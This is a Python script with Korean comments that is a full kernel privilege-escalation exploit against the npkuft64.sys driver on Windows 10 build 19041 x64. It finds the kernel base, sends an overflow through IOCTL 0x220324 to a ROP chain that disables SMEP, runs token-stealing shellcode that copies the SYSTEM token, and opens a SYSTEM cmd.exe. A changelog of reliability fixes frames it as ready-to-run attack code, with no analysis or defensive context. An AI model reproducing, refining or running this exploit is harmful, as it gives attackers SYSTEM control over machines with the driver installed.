"""
npkuft64.sys Kernel Exploit — Token Stealing + WinExec Shell
Windows 10 19041 x64 전용

수정 내역:
  [FIX 1] 커널 베이스 자동 감지 (EnumDeviceDrivers) — 하드코딩 제거
  [FIX 2] Token Stealing jnz 오프셋: 0xE8 → 0xE6 (명령어 중간 착지 버그)
  [FIX 3] CreateFileA/DeviceIoControl restype 설정 (64비트 핸들 잘림 방지)
  [FIX 4] 모든 Win32 API에 restype/argtypes 명시
"""

import ctypes
import struct
import sys

# ==========================================================
# 도구 함수
# ==========================================================
def p64(value):
    return struct.pack('<Q', value)

def log_info(msg):
    print(f"[*] {msg}")

def log_success(msg):
    print(f"[+] {msg}")

def log_error(msg):
    print(f"[-] {msg}")

# ==========================================================
# Win32 API 타입 설정 (64비트 포인터 잘림 방지)
# ==========================================================
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi

MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
INVALID_HANDLE_VALUE = 0xFFFFFFFFFFFFFFFF

kernel32.VirtualAlloc.restype  = ctypes.c_void_p
kernel32.VirtualAlloc.argtypes = [
    ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32
]

kernel32.GetProcAddress.restype  = ctypes.c_void_p
kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

# [FIX 3] CreateFileA — HANDLE은 64비트
kernel32.CreateFileA.restype  = ctypes.c_void_p
kernel32.CreateFileA.argtypes = [
    ctypes.c_char_p, ctypes.c_uint32, ctypes.c_uint32,
    ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p
]

# [FIX 3] DeviceIoControl
kernel32.DeviceIoControl.restype  = ctypes.c_bool
kernel32.DeviceIoControl.argtypes = [
    ctypes.c_void_p, ctypes.c_uint32,
    ctypes.c_void_p, ctypes.c_uint32,
    ctypes.c_void_p, ctypes.c_uint32,
    ctypes.POINTER(ctypes.c_ulong), ctypes.c_void_p
]

kernel32.GetLastError.restype  = ctypes.c_uint32
kernel32.GetLastError.argtypes = []

kernel32.CloseHandle.restype  = ctypes.c_bool
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

psapi.EnumDeviceDrivers.restype  = ctypes.c_bool
psapi.EnumDeviceDrivers.argtypes = [
    ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)
]

psapi.GetDeviceDriverBaseNameA.restype  = ctypes.c_uint32
psapi.GetDeviceDriverBaseNameA.argtypes = [
    ctypes.c_void_p, ctypes.c_char_p, ctypes.c_uint32
]

# ==========================================================
# 1. 커널 베이스 주소 자동 감지 (KASLR 대응)
# ==========================================================
# [FIX 1] 하드코딩 제거 — 재부팅마다 바뀌는 KASLR 주소를 자동으로 가져옴
def get_kernel_base():
    """EnumDeviceDrivers로 ntoskrnl 베이스 주소를 자동으로 가져옵니다."""
    array_size = 1024
    drivers = (ctypes.c_void_p * array_size)()
    cb_needed = ctypes.c_uint32()

    if not psapi.EnumDeviceDrivers(
        ctypes.byref(drivers),
        ctypes.sizeof(drivers),
        ctypes.byref(cb_needed)
    ):
        log_error("EnumDeviceDrivers 실패!")
        sys.exit(1)

    num_drivers = cb_needed.value // ctypes.sizeof(ctypes.c_void_p)

    name_buf = ctypes.create_string_buffer(256)
    for i in range(min(num_drivers, array_size)):
        if drivers[i] is None:
            continue
        psapi.GetDeviceDriverBaseNameA(drivers[i], name_buf, 256)
        name = name_buf.value.decode('ascii', errors='ignore').lower()
        if 'ntoskrnl' in name or 'ntkrnl' in name:
            log_success(f"커널 베이스 자동 감지: {hex(drivers[i])} ({name})")
            return drivers[i]

    log_error("ntoskrnl을 찾을 수 없습니다!")
    sys.exit(1)

kernel_base = get_kernel_base()

# ==========================================================
# 2. ROP 가젯 오프셋 (Windows 10 19041 x64 전용)
# ==========================================================
# 이 오프셋들은 같은 Windows 빌드에서는 변하지 않습니다.
# 다른 빌드를 사용하면 WinDbg에서 다시 찾아야 합니다.
off_pop_rcx = 0x2079ac     # pop rcx; ret
off_mov_cr4 = 0x3a0397     # mov cr4, rcx; ret
off_iretq   = 0xa15c22     # iretq

gadget_pop_rcx = kernel_base + off_pop_rcx
gadget_mov_cr4 = kernel_base + off_mov_cr4
gadget_iretq   = kernel_base + off_iretq
target_cr4     = 0x70678    # CR4 with SMEP/SMAP disabled

log_info(f"Kernel Base : {hex(kernel_base)}")
log_info(f"Pop RCX     : {hex(gadget_pop_rcx)}")
log_info(f"Mov CR4,RCX : {hex(gadget_mov_cr4)}")
log_info(f"Iretq       : {hex(gadget_iretq)}")
log_info(f"Target CR4  : {hex(target_cr4)}")

# ==========================================================
# 3. 커널 셸코드 (Token Stealing + APC 상태 복원)
# ==========================================================
# Windows 10 19041 x64 오프셋:
#   gs:[0x188]                   → KPCR.CurrentThread (KTHREAD*)
#   KTHREAD  + 0x0B8             → ApcState.Process (EPROCESS*)
#   KTHREAD  + 0x1E4             → CombinedApcDisable (DWORD)
#   EPROCESS + 0x440             → UniqueProcessId
#   EPROCESS + 0x448             → ActiveProcessLinks.Flink
#   EPROCESS + 0x4B8             → Token
#
# 로직:
#   1. 현재 스레드의 APC 상태를 복원 (BSOD 0x1 방지)
#   2. 현재 프로세스의 EPROCESS를 rbx에 저장
#   3. ActiveProcessLinks를 순회하며 PID=4 (System) 찾기
#   4. System의 Token을 현재 프로세스에 복사
#   5. ret → ROP 체인의 다음 가젯(iretq)으로 복귀
#
# [FIX 5] APC_INDEX_MISMATCH (0x1) 수정:
#   iretq로 직접 유저 모드 복귀 시, 정상적인 시스템 콜 리턴 경로가
#   생략되어 KernelApcDisable이 -1(0xFFFF)로 남음.
#   → CombinedApcDisable (KTHREAD+0x1E4)을 0으로 직접 설정.
#
# 바이트 오프셋 맵:
#   0:  mov rax, gs:[0x188]        (9 bytes)
#   9:  mov dword [rax+0x1E4], 0   (10 bytes)  ← APC 수정!
#   19: mov rax, [rax+0xB8]        (7 bytes)
#   26: mov rbx, rax               (3 bytes)
#   29: mov rax, [rax+0x448]       (7 bytes)  ← 루프 시작
#   36: sub rax, 0x448             (6 bytes)
#   42: mov rcx, [rax+0x440]       (7 bytes)
#   49: cmp rcx, 4                 (4 bytes)
#   53: jnz -26                    (2 bytes)  ← 55 + (-26) = 29 (루프 시작)
#   55: mov rcx, [rax+0x4B8]       (7 bytes)
#   62: and cl, 0xF0               (3 bytes)
#   65: mov [rbx+0x4B8], rcx       (7 bytes)
#   72: ret                        (1 byte)

shellcode_token_steal = (
    b"\x65\x48\x8B\x04\x25\x88\x01\x00\x00"       # mov rax, gs:[0x188]         ; CurrentThread
    b"\xC7\x80\xE4\x01\x00\x00\x00\x00\x00\x00"   # mov dword [rax+0x1E4], 0   ; [FIX 5] APC 복원
    b"\x48\x8B\x80\xB8\x00\x00\x00"                 # mov rax, [rax+0xB8]        ; EPROCESS
    b"\x48\x89\xC3"                                   # mov rbx, rax               ; save current
    b"\x48\x8B\x80\x48\x04\x00\x00"                 # mov rax, [rax+0x448]       ; Flink
    b"\x48\x2D\x48\x04\x00\x00"                     # sub rax, 0x448
    b"\x48\x8B\x88\x40\x04\x00\x00"                 # mov rcx, [rax+0x440]       ; PID
    b"\x48\x83\xF9\x04"                               # cmp rcx, 4
    b"\x75\xE6"                                       # jnz loop                   ; [FIX 2] 0xE6
    b"\x48\x8B\x88\xB8\x04\x00\x00"                 # mov rcx, [rax+0x4B8]       ; System Token
    b"\x80\xE1\xF0"                                   # and cl, 0xF0
    b"\x48\x89\x8B\xB8\x04\x00\x00"                 # mov [rbx+0x4B8], rcx       ; Steal!
    b"\xC3"                                           # ret
)

sc_ptr = kernel32.VirtualAlloc(
    0, len(shellcode_token_steal), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
)
if not sc_ptr:
    log_error("셸코드 메모리 할당 실패")
    sys.exit(1)
ctypes.memmove(sc_ptr, shellcode_token_steal, len(shellcode_token_steal))
shellcode_addr = sc_ptr
log_success(f"Token Stealing 셸코드: {hex(shellcode_addr)} ({len(shellcode_token_steal)} bytes)")

# ==========================================================
# 4. 유저 모드 복귀 (WinExec Trampoline)
# ==========================================================
# WinExec("cmd.exe", SW_SHOW) 호출로 새 cmd 창을 엽니다.
# system() 대신 사용 — CRT 데드락 방지.

WinExec_addr = kernel32.GetProcAddress(kernel32._handle, b"WinExec")
if not WinExec_addr:
    log_error("WinExec 주소 확인 실패")
    sys.exit(1)

cmd_str = b"cmd.exe\x00"
cmd_str_addr = kernel32.VirtualAlloc(
    0, len(cmd_str), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
)
if not cmd_str_addr:
    log_error("cmd_str 메모리 할당 실패")
    sys.exit(1)
ctypes.memmove(cmd_str_addr, cmd_str, len(cmd_str))

# 유저 모드 트램폴린 셸코드
# iretq로 유저 모드 복귀 후 실행됨 (Ring 3)
# RSP가 이미 16바이트 정렬 상태이므로 sub rsp, 0x20 사용 (0x28 아님)
user_stub = (
    b"\x48\xB9" + struct.pack('<Q', cmd_str_addr)   # mov rcx, cmd_str_addr
    + b"\x48\xC7\xC2\x05\x00\x00\x00"               # mov rdx, 5 (SW_SHOW)
    + b"\x48\xB8" + struct.pack('<Q', WinExec_addr)  # mov rax, WinExec_addr
    + b"\x48\x83\xEC\x20"                             # sub rsp, 0x20
    + b"\xFF\xD0"                                      # call rax
    + b"\x48\x83\xC4\x20"                             # add rsp, 0x20
    + b"\xEB\xFE"                                      # jmp $ (무한루프)
)

user_stub_addr = kernel32.VirtualAlloc(
    0, len(user_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
)
if not user_stub_addr:
    log_error("user_stub 메모리 할당 실패")
    sys.exit(1)
ctypes.memmove(user_stub_addr, user_stub, len(user_stub))

user_stack_base = kernel32.VirtualAlloc(
    0, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
)
if not user_stack_base:
    log_error("유저 스택 할당 실패")
    sys.exit(1)

user_rip    = user_stub_addr
user_sp     = user_stack_base + 0x10000 - 0x100
user_cs     = 0x33
user_ss     = 0x2b
user_rflags = 0x246

log_success(f"WinExec 트램폴린 : {hex(user_rip)}")
log_success(f"유저 스택 SP     : {hex(user_sp)}")

# ==========================================================
# 5. ROP 페이로드 구성
# ==========================================================
# 스택 레이아웃 (오버플로우 이후):
#
#   [padding 24 bytes]
#   [pop rcx; ret]       ← RSP가 여기를 가리킴
#   [target_cr4]         ← rcx에 로드됨
#   [mov cr4, rcx; ret]  ← SMEP 해제!
#   [shellcode_addr]     ← 유저 공간 코드 실행 (Ring 0, SMEP off)
#   [iretq]              ← 셸코드 ret 후 여기로
#   [user_rip]           ← iretq가 팝 (RIP)
#   [user_cs]            ← iretq가 팝 (CS = 0x33)
#   [user_rflags]        ← iretq가 팝 (RFLAGS = 0x246)
#   [user_sp]            ← iretq가 팝 (RSP)
#   [user_ss]            ← iretq가 팝 (SS = 0x2b)

padding = b'A' * 24

rop_chain  = b''
rop_chain += p64(gadget_pop_rcx)    # [1] SMEP 해제
rop_chain += p64(target_cr4)
rop_chain += p64(gadget_mov_cr4)
rop_chain += p64(shellcode_addr)    # [2] Token Stealing
rop_chain += p64(gadget_iretq)      # [3] 유저 모드 복귀
rop_chain += p64(user_rip)
rop_chain += p64(user_cs)
rop_chain += p64(user_rflags)
rop_chain += p64(user_sp)
rop_chain += p64(user_ss)

final_payload = padding + rop_chain
log_info(f"페이로드 크기: {len(final_payload)} bytes")

# ==========================================================
# 6. 익스플로잇 전송
# ==========================================================
driver_handle = kernel32.CreateFileA(
    b"\\\\.\\npkuft64",
    GENERIC_READ | GENERIC_WRITE,
    0, None, OPEN_EXISTING, 0, None
)

if driver_handle is None or driver_handle == INVALID_HANDLE_VALUE:
    log_error("드라이버 핸들 열기 실패! (관리자 권한? 드라이버 로드?)")
    sys.exit(1)

log_success("드라이버 핸들 열림!")

ioctl_code = 0x220324
in_buffer  = ctypes.create_string_buffer(final_payload)
out_buffer = ctypes.create_string_buffer(1024)
bytes_ret  = ctypes.c_ulong()

log_info("페이로드 전송 중...")

ret = kernel32.DeviceIoControl(
    driver_handle, ioctl_code,
    in_buffer, len(final_payload),
    out_buffer, len(out_buffer),
    ctypes.byref(bytes_ret), None
)

if ret:
    log_success("익스플로잇 전송 성공!")
else:
    err = kernel32.GetLastError()
    log_error(f"DeviceIoControl 실패: 에러 코드 {err}")

kernel32.CloseHandle(driver_handle)
